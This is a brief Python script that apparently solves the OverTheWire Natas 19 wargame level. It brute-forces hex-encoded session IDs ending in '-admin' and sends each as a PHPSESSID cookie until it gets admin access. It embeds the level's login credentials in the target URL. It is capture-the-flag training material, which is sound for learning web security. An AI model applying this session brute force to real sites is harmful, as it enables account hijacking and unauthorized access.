import requests

target = 'http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org/'
okaystr = 'You are an admin.'

cleverstr = '-admin'

for i in range(1, 641):
	s = str(i)+cleverstr
	sessid = s.encode('hex')
	print('trying..'+sessid)
	cookies = dict(PHPSESSID=sessid)
	r = requests.get(target, cookies=cookies)
	if r.content.find(okaystr) != -1:
		print(r.content)
		break


